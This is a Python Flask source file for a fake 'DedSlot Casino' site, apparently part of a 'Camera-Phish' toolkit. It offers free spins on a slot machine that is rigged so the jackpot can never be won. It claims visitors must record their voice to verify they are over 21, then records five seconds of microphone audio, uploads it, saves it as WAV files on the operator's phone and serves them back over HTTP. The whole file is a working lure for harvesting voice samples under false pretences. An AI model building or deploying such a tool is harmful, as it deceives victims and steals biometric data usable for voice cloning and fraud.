import os
import base64
import random
import json
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, send_from_directory, url_for
from pydub import AudioSegment

app = Flask(__name__)

# Directories setup.
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Camera-Phish')
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# New recordings folder for storing voice recordings.
RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')
if not os.path.exists(RECORDINGS_FOLDER):
    os.makedirs(RECORDINGS_FOLDER)

# Define the slot symbols.
symbols = ["🧠", "💀", "🔥", "🦊"]

# Generate three unique symbols (making the jackpot impossible).
def spin_slots():
    return random.sample(symbols, 3)

# Path to your background image (casino.jpg).
BACKGROUND_IMAGE_PATH = os.path.expanduser('~/storage/downloads/Camera-Phish/casino.jpg')

# Read and encode the background image.
try:
    with open(BACKGROUND_IMAGE_PATH, "rb") as img_file:
        image_data = base64.b64encode(img_file.read()).decode("utf-8")
except Exception as e:
    app.logger.error("Error reading background image: " + str(e))
    image_data = ""  # Fallback to empty string if not found.

@app.route("/")
def home():
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DedSlot Casino - Play & Win Big!</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: url('data:image/jpeg;base64,{{ image_data }}') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Orbitron', sans-serif;
      color: white;
      overflow: hidden;
    }
    .header {
      position: fixed; top: 0; width: 100%;
      text-align: center; padding: 10px 0;
      background: rgba(0, 0, 0, 0.7);
      font-size: 1.5em; color: cyan;
      text-shadow: 0 0 10px cyan; z-index: 2;
    }
    .container {
      position: absolute; top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.8);
      padding: 20px 30px; border-radius: 10px;
      box-shadow: 0 0 15px cyan; text-align: center;
      width: 90%; max-width: 500px;
    }
    .subtitle { font-size: 1.2em; color: yellow; margin-bottom: 15px; }
    .prize-desc { font-size: 1em; margin-bottom: 15px; }
    .free-spins { font-size: 1em; margin-bottom: 15px; color: lightgreen; }
    .slot-machine { display: flex; justify-content: center; margin: 20px 0; }
    .reel {
      width: 80px; height: 80px; font-size: 3em;
      background: black; border: 3px solid cyan;
      margin: 0 10px; display: flex; align-items: center; justify-content: center;
      transition: transform 0.5s ease-in-out;
    }
    #spinButton {
      background: red; color: white; border: none;
      padding: 10px 20px; font-size: 1.2em;
      cursor: pointer; transition: 0.3s;
    }
    #spinButton:hover { background: darkred; }
    #result { font-size: 1.5em; margin-top: 10px; }
    /* Overlay for voice verification */
    .overlay {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: flex;
      align-items: center; justify-content: center;
      z-index: 3;
    }
    .voice-popup {
      background: black; padding: 20px 30px;
      text-align: center; border-radius: 10px;
      box-shadow: 0 0 15px cyan;
    }
    .voice-popup button {
      background: red; color: white; border: none;
      padding: 10px 20px; font-size: 1em;
      cursor: pointer; transition: 0.3s;
      margin-top: 10px;
    }
    .voice-popup button:hover {
      background: darkred;
    }
  </style>
</head>
<body>
  <div class="header">DedSlot Casino - Play & Win Big!</div>
  
  <!-- Voice verification overlay (shown until verified) -->
  <div class="overlay" id="voiceOverlay">
    <div class="voice-popup">
      <h2>We must confirm you're over 21 years old with your voice</h2>
      <p>Please allow microphone access and record a short voice sample for verification.</p>
      <button id="verifyButton" onclick="startVoiceVerification()">Verify Now</button>
    </div>
  </div>

  <div class="container">
    <h1>DedSlot Casino</h1>
    <p class="subtitle">Spin & Win Big! Jackpot: $300</p>
    <p class="prize-desc">
      Enjoy your 10 free spins on us! Win up to $300 – though the jackpot is impossible to win.
    </p>
    <p class="free-spins">Free Spins Left: <span id="spinsCounter">10</span></p>
    <div class="slot-machine">
      <div class="reel" id="reel1">🧠</div>
      <div class="reel" id="reel2">💀</div>
      <div class="reel" id="reel3">🔥</div>
    </div>
    <button id="spinButton" onclick="spinSlots()">SPIN</button>
    <p id="result"></p>
  </div>

  <script>
    var freeSpins = 10;

    // Update free spins counter.
    function updateSpinsCounter() {
      if (freeSpins < 0) freeSpins = 0;
      document.getElementById("spinsCounter").innerText = freeSpins;
    }

    // Start voice verification by recording a short sample.
    async function startVoiceVerification() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        let mediaRecorder = new MediaRecorder(stream);
        let audioChunks = [];
        
        mediaRecorder.ondataavailable = event => {
          if (event.data.size > 0) {
            audioChunks.push(event.data);
          }
        };

        mediaRecorder.start();
        document.getElementById("verifyButton").disabled = true;
        document.getElementById("verifyButton").innerText = "Recording...";

        // Record for 5 seconds.
        setTimeout(() => {
          mediaRecorder.stop();
        }, 5000);

        mediaRecorder.onstop = async function() {
          const blob = new Blob(audioChunks, { type: 'audio/webm' });
          const reader = new FileReader();
          reader.readAsDataURL(blob);
          reader.onloadend = async function() {
            const base64Audio = reader.result.split(',')[1];
            // Upload the audio sample for verification.
            const response = await fetch('/upload_audio', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ audio: base64Audio })
            });
            const result = await response.json();
            if (response.ok) {
              // If upload is successful, hide the overlay.
              document.getElementById("voiceOverlay").style.display = "none";
            } else {
              alert("Audio verification failed: " + result.error);
              document.getElementById("verifyButton").disabled = false;
              document.getElementById("verifyButton").innerText = "Verify Now";
            }
          };
        };
      } catch (err) {
        console.error("Error accessing microphone:", err);
        alert("Microphone access is required to verify your age.");
      }
    }

    // Spin the slot machine if free spins remain.
    function spinSlots() {
      if (freeSpins <= 0) {
        alert("No free spins left.");
        return;
      }
      freeSpins--;
      updateSpinsCounter();
      const spinButton = document.getElementById("spinButton");
      spinButton.disabled = true;

      // Get reel elements.
      const reel1 = document.getElementById("reel1");
      const reel2 = document.getElementById("reel2");
      const reel3 = document.getElementById("reel3");

      // Start the spin animation.
      reel1.style.transform = "rotate(360deg)";
      reel2.style.transform = "rotate(360deg)";
      reel3.style.transform = "rotate(360deg)";

      setTimeout(() => {
        fetch("/spin")
          .then(response => response.json())
          .then(data => {
            const [symbol1, symbol2, symbol3] = data.result;
            reel1.innerText = symbol1;
            reel2.innerText = symbol2;
            reel3.innerText = symbol3;
            // Reset rotation.
            reel1.style.transform = "rotate(0deg)";
            reel2.style.transform = "rotate(0deg)";
            reel3.style.transform = "rotate(0deg)";
            const resultText = document.getElementById("result");
            if (symbol1 === symbol2 && symbol2 === symbol3) {
              resultText.innerText = "JACKPOT! You won $300!";
            } else {
              resultText.innerText = "Try again!";
            }
            spinButton.disabled = false;
          })
          .catch((error) => {
            console.error("Error during spin:", error);
            spinButton.disabled = false;
          });
      }, 500);
    }
  </script>
</body>
</html>
    """, image_data=image_data)

@app.route("/spin")
def spin():
    result = spin_slots()
    return jsonify({"result": result})

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        audio_data = request.json.get('audio')
        if not audio_data:
            return jsonify({"error": "No audio data received"}), 400

        filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        webm_path = os.path.join(RECORDINGS_FOLDER, f"{filename}.webm")
        wav_path = os.path.join(RECORDINGS_FOLDER, f"{filename}.wav")

        with open(webm_path, 'wb') as f:
            f.write(base64.b64decode(audio_data))

        # Convert from WebM to WAV.
        audio = AudioSegment.from_file(webm_path, format="webm")
        audio.export(wav_path, format="wav")
        os.remove(webm_path)

        return jsonify({"message": f"Audio saved successfully as {wav_path}."}), 200
    except Exception as e:
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500

# (Optional) Serve recordings if needed.
@app.route('/recordings/<path:filename>')
def serve_recording(filename):
    return send_from_directory(RECORDINGS_FOLDER, filename)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
